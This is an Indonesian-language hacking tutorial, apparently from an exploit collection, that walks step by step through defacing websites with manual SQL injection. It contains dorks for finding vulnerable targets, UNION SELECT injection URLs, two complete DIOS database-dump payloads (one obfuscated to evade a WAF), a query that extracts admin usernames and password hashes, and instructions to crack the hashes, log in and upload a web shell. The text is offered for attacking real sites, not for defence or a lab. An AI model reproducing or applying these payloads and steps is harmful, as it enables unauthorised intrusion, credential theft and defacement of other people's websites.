@@ -1,0 +1,77 @@
+-------------------------------------------------------------------------------- ./ByF4lkuXploit --------------------------------------------------------------------------------
+
+
+Hari ini saya akan bagikan cara deface menggunakan teknik sql injection manual with DIOS. SQL Injection
+merupakan teknik Hacking dimana QUERY SQL di injectkan melalui URL yang selanjutnya akan diproses oleh
+komputer. Lalu apa itu DIOS? DIOS merupakan singkatan dari DUMP IN ONE SHOT. Maksud dari teknik ini adalah
+memunculkan seluruh isi database dalam satu queri saja.
+
+
+
+
+
+
+                                                                                   <\> BAHAN </>
+
+1. Dork SQL INJECTION :
+   - inurl:view.php?cid=
+   dork lainnya bisa dilihat disini
+   Mozilla with Tamper Data Addon (optional, kalo webnya gabisa upload php. jadi coba di bypass aja)
+
+
+
+
+
+                                                                                  <\> TUTORIAL </>
+1. Dorking target & pilih targetnya.
+
+2. Cek apakah VULN atau tidak dengan menambahkan karakter kutip ( ' ) dibelakang variabel ID nya. Note: jika VULN,
+   maka akan muncul 'You have an error in your SQL syntax blablabla...' atau halaman webnya berubah menjadi
+   kosong/error.
+   cth: site.co.li/index.php?id=69'
+
+3. Nah, kalo error seperti gambar diatas, sekarang tinggal kita cari tau jumlah TABLE yang ada pada databasenya,
+   cukup dengan menebak-nebak saja sih. Caranya tambahkan query ORDER BY serta jumlah tabel yang mau di cek.
+   cth: site.co.li/index.php?id=69+order+by+10--+-
+
+4. turunin lagi jumlah tablenya sampai ga ada error.
+   cth: site.co.li/index.php?id=69+order+by+9--+-  <  Error; Unknown column '9' in 'order clause'
+   site.co.li/index.php?id=69+order+by+8--+-  <  Error; Unknown column '8' in 'order clause'
+   site.co.li/index.php?id=69+order+by+7--+-  <  Error; Unknown column '7' in 'order clause'
+   site.co.li/index.php?id=69+order+by+6--+-  <  Error; Unknown column '6' in 'order clause'
+   site.co.li/index.php?id=69+order+by+5--+-  <  No Error
+
+5. Sekarang kita sudah tau berapa jumlah tablenya. Tinggal cari table yang VULNERABLE. Caranya masukan query
+   UNION SELECT dan dibarengi jumlah tablenya serta tambahkan karakter minus ( - ) di belakang variable IDnya.
+   cth: site.co.li/index.php?id=-69+union+select+1,2,3,4,5--+-
+
+6. lihat dulu nomer yang VULNERABLE, lalu masukan QUERY DIOS pada nomor yang vulnerable tadi.
+   cth: site.co.li/index.php?id=-69+union+select+1,EXPLOIT,3,4,5--+-
+   MadBlood DIOS :
+   (Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+   ZEN with WAF DIOS:
+   (/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
+   Nanti hasilnya akan seperti ini. Lalu cari table yang sekiranya berhubungan dengan akun ADMIN.
+
+7. Ternyata terdapat table yang namanya "admins" sekaligus isi dari table admins nya sendiri
+   (id,code,name,password,dll pada gambar itulah yang dinamakan kolomnya). Tinggal kita cari tau isi dari kolom yang
+   kita inginkan seperti kolom username,password,email,dll. Caranya menggunakan query GROUP_CONCAT.
+   cth: site.co.li/index.php?id=-69+union+select+1,group_concat(id,0x3a,password,0x3a,name),3,4,5+from+admins--+-
+
+8. Sudah keliatan username & passwordnya kan? tapi passwordnya masih dalam keadaan dienkripsi (md5). Tinggal
+   Crack saja passwordnya. Caranya Tutorial Crack Password MD5.
+
+9. OK! GOT PASSWORD! tinggal login ke halaman adminnya! Cari halaman adminnya, biasanya dengan
+   menambahkan /admin atau /administrator pada webnya. atau bisa gunakan Tutorial Mencari Halaman Login Admin
+   Menggunakan DirBuster.
+   cth: site.co.li/admin
+
+10. LOGGED IN! dengan user SUPER ADMIN! tinggal kita cari tempat upload script/shell.
+
+11. Siapkan shell/script defacenya. lalu upload saja. Note: jika tidak bisa upload .php, lakukan Teknik Bypass Extension.
+
+12. UPLOADED! karena kita tadi nge-upload di form gambar, kita buka saja gambar/thumbnail yang muncul.
+    
+13. Shell Terupload! tinggal eksekusi saja! kali ini saya hanya ntip file saja walaupun bisa ngindex. Note: Ngindex? Backup dulu.
+
+14. DONE
